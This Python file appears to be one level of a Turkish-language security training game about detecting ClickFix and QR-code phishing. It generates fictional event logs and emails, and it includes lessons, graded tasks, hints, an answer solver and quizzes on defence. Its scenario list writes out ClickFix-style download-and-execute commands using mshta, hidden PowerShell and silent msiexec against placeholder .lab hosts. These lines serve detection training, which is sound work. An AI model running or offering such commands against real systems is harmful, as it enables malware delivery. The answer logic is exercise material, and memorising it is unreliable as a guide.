"""Cilt 16 · Bölüm 4 — Modern Phishing: ClickFix ve Quishing.

Beceri: iki yükselen phishing türünü izden tanımak. ClickFix: kullanıcı sahte bir "doğrulama / düzelt" sayfasına
kanıp panoya kopyalanan komutu Win+R ile kendi eliyle çalıştırır; olay kaydında `RunDialog` + `pano=evet` + dış adres
izi kalır. Quishing: e-postadaki QR kodun GERÇEK hedefi meşru görünen ama sahte (taklit) bir alan adıdır.

Vakalar: Ferah Bank, Paramix, Kuzgun Lojistik, Yeşiltepe Belediyesi, Medora Sağlık. Her şey KURGUSALDIR: alan adları
`.lab`, komutlar zararsız örnek desenlerdir; gerçek bir yük, sayfa ya da araç yoktur.
"""
from __future__ import annotations

import random
from datetime import timedelta
from functools import lru_cache
from pathlib import Path

from hy.motor.kontrol import Metin, Secmeli
from hy.motor.seviye import Adim, Gorev, Seviye
from hy.ortak import uretec as u
from hy.seviyeler.c16_sosyal.b02_phishing_tani import taklit_alan
from hy.seviyeler.c16_sosyal.ortak import sec_doldur, sh, vaka_sec

KOTU_HOSTLAR = ["insan-dogrulama.lab", "captcha-duzelt.lab", "tarayici-onar.lab", "oturum-dogrula.lab",
                "belge-goruntule-duzelt.lab"]
SENARYOLAR = [
    {"arac": "mshta", "tema": "'Ben robot değilim' (insan doğrulama) sayfası", "yol": "v.hta",
     "komut": "mshta http://{h}/v.hta"},
    {"arac": "powershell", "tema": "'Tarayıcınız güncel değil, düzeltin' sayfası", "yol": "p.txt",
     "komut": "powershell -w hidden -c iwr http://{h}/p.txt"},
    {"arac": "msiexec", "tema": "'Belge görüntüleyici hatası' sayfası", "yol": "k.msi",
     "komut": "msiexec /i http://{h}/k.msi /qn"},
]
SIRADAN = ["notepad", "calc", "cmd /c ipconfig", "mstsc", "control printers", "services.msc", "taskmgr"]
QR_KONULAR = ["Parola süreniz doluyor", "Yemekhane menüsü ve anket", "Bordro bilgilendirmesi", "Otopark kaydı yenileme",
              "Toplantı odası rezervasyonu", "Yeni VPN kurulum rehberi"]
SUBLAR = ["giris", "portal", "hesap"]
YOLLAR = ["yenile", "anket", "bordro", "kayit", "rezerv", "kurulum"]


@lru_cache(maxsize=32)
def _veri(alt: int) -> dict:
    rng = random.Random(alt)
    v = vaka_sec(rng)
    alan = v["alan"]
    sen = rng.choice(SENARYOLAR)
    h = rng.choice(KOTU_HOSTLAR)
    isimler = u.isimler(rng, 9)
    kurban, digerleri = isimler[0], isimler[1:]
    makineler = u.benzersiz(rng, lambda r: f"PC-{r.randint(100, 899)}", 9)
    mk = dict(zip(isimler, makineler))
    t0 = u.gun(rng) + timedelta(hours=8)
    olaylar = []   # (zaman, host, kullanici, kaynak, pano, komut)

    def an():
        return t0 + timedelta(minutes=rng.randint(0, 540), seconds=rng.randint(0, 59))

    olaylar.append((an(), mk[kurban], kurban, "RunDialog", "evet", sen["komut"].format(h=h)))
    for k in rng.sample(digerleri, 5):
        olaylar.append((an(), mk[k], k, "RunDialog", "hayir", rng.choice(SIRADAN)))
    bt = rng.sample(digerleri, 2)
    for k in bt:   # BT'nin verdiği meşru komut: pano=evet ama adres kurumun kendi alan adı
        olaylar.append((an(), mk[k], k, "RunDialog", "evet", f"powershell -c iwr http://yardim.{alan}/arac.txt"))
    for ad in ("yedek", "temizle"):
        olaylar.append((an(), "SRV-01", "sistem", "Zamanlayici", "hayir", f"powershell -File C:\\Is\\{ad}.ps1"))
    for k in rng.sample(digerleri, 3):   # meşru doğrulama sayfası: komut istemez
        olaylar.append((an(), mk[k], k, "Tarayici", "hayir", f"captcha-dogrulama-tamam https://{alan}/giris"))
    olaylar.sort(key=lambda o: o[0])
    satirlar = [f"{t:%Y-%m-%dT%H:%M:%S} {ho} {ku} {ka} pano={pa} {ko}" for t, ho, ku, ka, pa, ko in olaylar]
    # --- QR e-postaları: 1 sahte, 3 meşru
    taklit = taklit_alan(alan, rng)
    konular = rng.sample(QR_KONULAR, 4)
    yollar = rng.sample(YOLLAR, 4)
    sub = rng.choice(SUBLAR)
    hedefler = [f"https://{sub}.{taklit}/{yollar[0]}", f"https://{alan}/{yollar[1]}",
                f"https://yardim.{alan}/{yollar[2]}", f"https://ik.{alan}/{yollar[3]}"]
    sira = list(range(4))
    rng.shuffle(sira)
    bloklar = []
    for no, i in enumerate(sira, 1):
        gonderen = f"bilgi@{alan}"
        bloklar.append(f"NO: {no}\nGONDEREN: {gonderen}\nKONU: {konular[i]}\nQR_HEDEF: {hedefler[i]}\n")
    return {"v": v, "sen": sen, "host": h, "kurban": kurban, "makine": mk[kurban], "satirlar": satirlar,
            "bloklar": bloklar, "taklit": taklit}


def uret(rng):
    alt = rng.randint(10_000_000, 999_999_999)
    d = _veri(alt)
    v, sen = d["v"], d["sen"]
    return {
        "vaka": f"{v['ad']} — sahte doğrulama sayfası ve QR e-postası",
        "_alt": alt,
        "metin": {"musteri": v["ad"], "sektor": v["sektor"], "alan": v["alan"], "hikaye": v["hikaye"],
                  "tema": sen["tema"]},
        "cevaplar": {"kurban": d["kurban"], "arac": sen["arac"], "host": d["host"], "makine": d["makine"],
                     "qr": d["taklit"]},
    }


def yaz(lab: Path, s: dict) -> None:
    d = _veri(s["_alt"])
    v = d["v"]
    u.yaz(lab / "OKUBENI.txt",
          f"{v['ad']} modern phishing dosyaları. KURGUSAL; meşru alan adı: {v['alan']}\n"
          "olaylar.log   : bilgisayar olay kaydı (zaman makine kullanici kaynak pano komut)\n"
          "                kaynak=RunDialog -> Win+R 'Çalıştır' penceresi; pano=evet -> komut panodan yapıştırıldı\n"
          "eposta_qr.txt : QR kod içeren dört e-postanın çözümlenmiş QR hedefleri\n")
    u.yaz(lab / "olaylar.log", "\n".join(d["satirlar"]) + "\n")
    u.yaz(lab / "eposta_qr.txt", "\n".join(d["bloklar"]))


def coz(lab: Path, s: dict) -> dict:
    alan = s["v"]["alan"] if "v" in s else _veri(s["_alt"])["v"]["alan"]
    sec = ("grep ' RunDialog pano=evet ' olaylar.log | grep -E ' (mshta|powershell|msiexec) ' | "
           f"grep -v '{alan}' | head -1")
    kurban = sh(f"{sec} | awk '{{print $3}}'", lab)
    makine = sh(f"{sec} | awk '{{print $2}}'", lab)
    arac = sh(f"{sec} | awk '{{print $6}}'", lab)
    host = sh(f"{sec} | grep -o 'http://[^/ ]*' | cut -d/ -f3", lab)
    qr = sh("grep '^QR_HEDEF:' eposta_qr.txt | cut -d/ -f3 | awk -F. '{print $(NF-1)\".\"$NF}' | "
            f"grep -v '^{alan}$' | sort -u", lab)
    return sec_doldur({1: kurban, 2: arac, 3: host, 4: makine, 5: qr}, GOREVLER, lab, s)


def _kurban_hata(g, beklenen, b):
    d = _veri(b.senaryo["_alt"])
    if g.startswith("pc-"):
        return "Bu makine adı; kullanıcı adı üçüncü sütundadır."
    if g in {x.split()[2] for x in d["satirlar"] if " pano=evet " in x}:
        return ("Bu kullanıcı da panodan komut çalıştırmış ama adres kurumun kendi alan adında: BT'nin verdiği meşru komut. "
                "ClickFix'te komut DIŞ bir adrese gider.")
    return None


def _arac_hata(g, beklenen, b):
    if g in ("rundialog", "win+r", "calistir"):
        return "Bu çalıştırma yolu (Win+R). Aranan, komutun ilk sözcüğü olan **araç** adı."
    return None


def _host_hata(g, beklenen, b):
    if g.startswith("http") or "/" in g:
        return "Adres değil, yalnızca **alan adı** (örn. `ornek.lab`) bekleniyor."
    return None


def _makine_hata(g, beklenen, b):
    d = _veri(b.senaryo["_alt"])
    if g == d["kurban"]:
        return "Bu kullanıcı adı; izole edilecek **makinenin** adı (`PC-...`) isteniyor."
    return None


def _qr_hata(g, beklenen, b):
    if g.startswith("http") or "/" in g:
        return "Adres değil, yalnızca **asıl alan adı** bekleniyor."
    if g.endswith("." + beklenen):
        return "Alt alan adını (en soldaki parça) at: asıl alan adı son iki etikettir."
    if g == _veri(b.senaryo["_alt"])["v"]["alan"]:
        return "Bu müşterinin meşru alan adı; sahte olanı ara."
    return None


ADIMLAR = [
    Adim("İki yeni numara: ClickFix ve Quishing", """
Klasik phishing'de kullanıcıyı bağlantıya tıklatırsın ve posta filtresi, tarayıcı uyarısı gibi savunmalar araya girer.
İki yükselen yöntem bu savunmaları **dolanır**:

- **ClickFix** (sahte "düzelt/doğrula" ekranı): sayfa "robot olmadığını kanıtla" ya da "hatayı düzelt" der, gizlice panoya
  (kopyala-yapıştır alanı) bir komut koyar ve kullanıcıya "Win+R, yapıştır, Enter" yaptırır. Kötü komutu **kullanıcı kendisi**
  çalıştırır.
- **Quishing** (QR + phishing): bağlantı yerine QR kod konur. QR'ı **telefon** okutur; e-posta filtreleri çoğu zaman resmin
  içindeki adresi görmez ve telefon şirketin korumasının dışındadır.

Önce dosyalara bak:
""", komut="ls"),
    Adim("Olay kaydı: kim, nerede, ne çalıştırdı", """
`olaylar.log` her satırda şunu tutar: zaman, makine, kullanıcı, kaynak, pano durumu ve komut. `RunDialog`, Win+R
penceresidir; `pano=evet`, komutun elle yazılmadığını, **panodan yapıştırıldığını** gösterir:
""", komut="head -8 olaylar.log"),
    Adim("ClickFix'in izi: panodan yapıştırılan komutlar", """
Elle yazan insan `notepad` ya da `calc` yazar; ClickFix kurbanı uzun, tuhaf bir komutu **yapıştırır**. Panodan gelenleri süz:
""", komut="grep ' RunDialog pano=evet ' olaylar.log", sonra="""
Satırlarda iki tür komut var. İkisinde de `powershell` geçiyor ama biri kurumun kendi adresine, diğeri başka bir yere gidiyor.
"""),
    Adim("Şüpheli araçlar ve dış adres", """
Sistem araçlarının kötüye kullanımı (`mshta`, `powershell`, `msiexec`) ClickFix'in imzasıdır. Bu araçlar normalde internetten bir
şey indirip çalıştırmak için kullanılmaz. Panodan gelenleri bu araçlarla süz, sonra adreslerin alan adlarını çıkar:
""", komut="grep ' RunDialog pano=evet ' olaylar.log | grep -E ' (mshta|powershell|msiexec) '", sonra="""
**Hacker gözüyle:** Bu komutlar bu oyunda zararsız örnek desenlerdir. Gerçekte ise en tehlikeli yanı şudur: kullanıcı kendi
yetkisiyle çalıştırdığı için indirme uyarısı, e-posta eki taraması gibi katmanlar hiç devreye girmez.
"""),
    Adim("URL'den alan adını çıkarmak", """
`grep -o` yalnızca eşleşen kısmı basar; `cut` ile alan adını ayır; `sort | uniq -c` ile say. Kurumun kendi alan adı ile
bilinmeyen alan adı yan yana görünür:
""", komut="grep -o 'http://[^/ ]*' olaylar.log | cut -d/ -f3 | sort | uniq -c"),
    Adim("Quishing: QR'ın gerçek hedefi", """
QR kodu çözülmüş dört e-posta var. Görünürde hepsi şirketten; ama QR'ın **gerçek hedefi** `QR_HEDEF` satırındadır:
""", komut="cat eposta_qr.txt", sonra="""
Alan adı sağdan sola okunur (Cilt 2): `giris.ornek.lab` içinde asıl alan adı `ornek.lab`'dir, soldaki `giris` sadece alt alan adıdır.
"""),
    Adim("Hedef alan adlarını ayrıştırmak", """
Her QR hedefinden alan adını çıkar, son iki etiketi al ve say. Meşru alan adından farklı olan tek kayıt sahtedir:
""", komut="grep '^QR_HEDEF:' eposta_qr.txt | cut -d/ -f3 | awk -F. '{print $(NF-1)\".\"$NF}' | sort | uniq -c"),
]

GOREVLER = [
    Gorev("`olaylar.log` içinde **ClickFix'e kanan kullanıcıyı** bul: Win+R ile **panodan yapıştırılan** ve **<<alan>> dışında bir "
          "adrese** giden `mshta`/`powershell`/`msiexec` komutunu çalıştıran kullanıcı. Kullanıcı adını yaz.",
          Metin("kurban", bicim="kullanıcı adı", sik_hatalar=_kurban_hata),
          ("Üç şeyi birlikte ara: Win+R (`RunDialog`), panodan yapıştırma (`pano=evet`) ve kurum dışı adres.",
           "`grep ' RunDialog pano=evet ' olaylar.log | grep -E ' (mshta|powershell|msiexec) '` listeyi daraltır; kurumun kendi alan adına giden satır meşrudur.",
           "`... | grep -v '<<alan>>'` kalan tek satırın **üçüncü** sütunu kullanıcıdır (`awk '{print $3}'`)."),
          puan=40, baslik="ClickFix'e kanan kullanıcı"),
    Gorev("Bu kullanıcının çalıştırdığı komutta hangi **sistem aracı** kullanılmış? (komutun ilk sözcüğü)",
          Metin("arac", bicim="araç adı", sik_hatalar=_arac_hata),
          ("Satırın son bölümü komuttur; komutun ilk sözcüğü araçtır.",
           "Altıncı sütundur: `awk '{print $6}'`. Önceki görevde bulduğun satırı kullan.",
           "Seçenekler `mshta`, `powershell` ya da `msiexec` olabilir; satırda hangisi yazıyorsa o."),
          puan=30, baslik="Çalıştırılan araç"),
    Gorev("Aynı komut kullanıcının makinesine kötü içeriği **hangi dış alan adından** indirtmeye çalışıyor? (yalnızca alan adı)",
          Metin("host", bicim="alan adı (...lab)", sik_hatalar=_host_hata),
          ("Komutun içinde `http://` ile başlayan bir adres var.",
           "`grep -o 'http://[^/ ]*'` adresi, `cut -d/ -f3` alan adını verir.",
           "Kurumun kendi alan adı (<<alan>>) cevap değildir; sahte sayfanın indirme adresi aranıyor."),
          puan=40, baslik="Dış indirme alan adı"),
    Gorev("Olayı sınırlamak için hangi **makineyi** ağdan izole etmek gerekir? (makine adı, `PC-...`)",
          Metin("makine", bicim="makine adı", sik_hatalar=_makine_hata),
          ("Satırın ikinci sütunu makine adıdır, üçüncüsü kullanıcı.",
           "Kullanıcıyı bulduğun satırda `awk '{print $2}'` makineyi verir.",
           "Cevap `PC-` ile başlayan bir ad."),
          puan=25, baslik="İzole edilecek makine"),
    Gorev("`eposta_qr.txt` içindeki dört e-postadan birinin **QR kodu** sahte bir alan adına gidiyor. O sahte **asıl alan adını** yaz "
          "(alt alan adını atma, yalnızca son iki etiket).",
          Metin("qr", bicim="alan adı (...lab)", sik_hatalar=_qr_hata),
          ("E-postanın göndereni <<alan>> gibi görünüyor ama QR'ın hedefine bakmak gerekir.",
           "`grep '^QR_HEDEF:' eposta_qr.txt` dört hedefi gösterir; `cut -d/ -f3` alan adlarını ayırır.",
           "Üçü <<alan>> alan adının alt alan adlarıdır; <<alan>>'a benzeyen ama farklı olan tek alan adı cevaptır."),
          puan=40, baslik="Quishing hedef alanı"),
    Gorev("ClickFix, klasik 'bağlantıya tıkla' phishing'inden **neden daha tehlikelidir**?",
          Secmeli([
              ("Kötü komutu kullanıcı kendisi çalıştırdığı için e-posta ve indirme korumaları çoğu zaman devreye girmez",
               "Doğru. Kullanıcının kendi yetkisiyle yaptığı işlem 'meşru' görünür; filtreler ve indirme uyarıları atlanır."),
              ("Sayfa, antivirüs yazılımını ziyaretçinin haberi olmadan uzaktan kapatır",
               "Yanlış. Sayfa antivirüsü kapatmaz; tehlikesi, komutu kullanıcının kendisine çalıştırtmasıdır."),
              ("Yalnızca eski sürüm Windows bilgisayarlarda çalışır, o yüzden güncel sistemler risk altında değildir",
               "Yanlış. Yöntem bir yazılım açığına değil, kullanıcının davranışına dayanır; güncel sistemde de çalışır."),
              ("Komut yalnızca tarayıcı önbelleğini siler, ama kullanıcı bunu fark edemez ve şaşırır",
               "Yanlış. Komut kötü içerik indirip çalıştırmak için kullanılır; sayfanın söylediği ile komutun yaptığı farklıdır."),
          ], dogru=0),
          ("Saldırı, yazılımın bir açığını mı kullanıyor, yoksa kullanıcının kendi eliyle yaptığı bir işlem mi?",
           "Filtreler 'kullanıcı kendi isteğiyle yaptı' dediğinde ne yapar?",
           "Doğru şık, komutu kullanıcının kendisinin çalıştırdığını anlatan şık."),
          puan=25, baslik="ClickFix neden tehlikeli"),
    Gorev("Bu olay için **doğru savunma** hangisidir?",
          Secmeli([
              ("Makineyi izole et, sahte alan adını ve adresleri engelle (IoC), kullanıcının parolalarını yenile ve herkese farkındalık duyurusu yap",
               "Doğru. Sınırla (izole), yay (engelle), hasarı gider (parola), tekrarını azalt (farkındalık)."),
              ("Yalnızca kullanıcıyı uyar ve makineyi olduğu gibi kullanmaya devam ettir",
               "Yanlış. Komut çalıştıysa makine zaten tehlikede olabilir; izole etmeden bırakmak riski büyütür."),
              ("Sahte sayfanın bağlantısını yalnızca bu kullanıcının e-postasından silip olayı kapatmak",
               "Yanlış. Kötü komut çoktan çalışmış olabilir; engelleme ve izolasyon olmadan olay kapatılamaz."),
              ("Kullanıcıyı suçlu ilan edip bunu herkese duyurmak ve başka bir şey yapmamak",
               "Yanlış. Teşhir, bildirme kültürünü öldürür; teknik önlemler de atlanmış olur."),
          ], dogru=0),
          ("Önce olayı yayılmaktan nasıl durdurursun, sonra neyi engellersin?",
           "IoC (Indicator of Compromise, ele veren iz) olarak alan adı ve adres engellenir; kullanıcı suçlanmaz.",
           "Doğru şık izolasyon, engelleme, parola yenileme ve farkındalığı birlikte sayan şık."),
          puan=25, baslik="Doğru savunma"),
]

SEVIYE = Seviye(
    kimlik="c16b04",
    cilt=16,
    bolum=4,
    baslik="Modern Phishing: ClickFix ve Quishing",
    brifing="""
**<<musteri>>** (<<sektor>>) güvenlik ekibi iki uyarı aldı. <<hikaye>> Ayrıca bir çalışan <<tema>> gördüğünü, ekrandaki
adımları izleyip bir şey çalıştırdığını söyledi. Aynı gün dört çalışan, QR kodlu bir e-posta için de soru sordu.

Deniz: "Bu sefer kimse bir bağlantıya tıklamadı; kullanıcı komutu kendi elleriyle çalıştırmış. Olay kaydında izi bul." Selin:
"QR e-postalarında da gerçek hedefi okuyalım; telefondan açılınca bizim filtrelerimiz görmüyor." Mert: "İkisi de aynı
numara: insanın güvenini kullanıp teknik korumayı dolanmak."

Dosyalar: `olaylar.log` ve `eposta_qr.txt`. Meşru alan adı **<<alan>>**.
""",
    adimlar=ADIMLAR,
    gorevler=GOREVLER,
    uret=uret,
    yaz=yaz,
    coz=coz,
    kapanis="""
ClickFix ve Quishing aynı fikrin iki yüzüdür: teknik korumanın baktığı yerden kaçıp insanı doğrudan ikna etmek. ClickFix'te komutu
kullanıcı kendisi çalıştırır; QR'da adres resmin içinde saklanıp telefona taşınır. Saldırgan açısından en büyük kazanç,
"kullanıcı kendi isteğiyle yaptı" görüntüsüdür. Savunmacı açısından dersler: panodan yapıştırılmış `mshta`/`powershell` komutlarını
olay kaydında aramak, QR hedefini çözüp alan adını okumak, olayda makineyi izole etmek, ele veren izleri (IoC) engellemek ve
kullanıcıyı suçlamadan farkındalığı artırmak.
""",
    gercek_hayat="""
- **ClickFix / FakeCAPTCHA:** Bu yöntem 2024'ün ortalarından itibaren güvenlik araştırmacıları tarafından raporlandı ve
  2025'te hızla yayılan phishing türlerinden biri oldu; sahte "insan doğrulama" (CAPTCHA) ve "hata düzeltme" sayfaları
  Win+R ile komut yapıştırtır. Birçok büyük güvenlik firması kampanyalarını yayımladı.
- **Quishing (QR phishing):** QR koduyla yapılan phishing 2023-2024'ten beri artan bir tür olarak raporlanıyor; kod resim
  olduğu için posta filtreleri adresi çoğu zaman göremez ve kurban telefonda, kurumsal korumanın dışında açar.
- **Önleme:** Kullanıcıya "bir sayfanın sana komut yapıştırtması ve Win+R'ye yazdırması normal değildir" öğretilmesi;
  Win+R (Çalıştır penceresinin) kısıtlanması ya da `mshta` gibi gereksiz araçların engellenmesi (AppLocker/uygulama
  kontrolü); QR kodu okutmadan önce önizlenen adresin okunması; yönetilen mobil cihazlarda güvenli tarayıcı koruması.
- **Tespit:** Olay kaydında panodan yapıştırılmış, internetten indiren `mshta`/`powershell`/`msiexec` komutları ve
  Çalıştır penceresinin üst süreç olarak görülmesi; kurum dışı alan adlarına ilk kez yapılan indirme isteği; benzer alan
  adı (taklit) izleme; bildirilen QR e-postalarının hedeflerinin tüm kutularda aranması.
""",
    sure_hedef_dk=30,
)
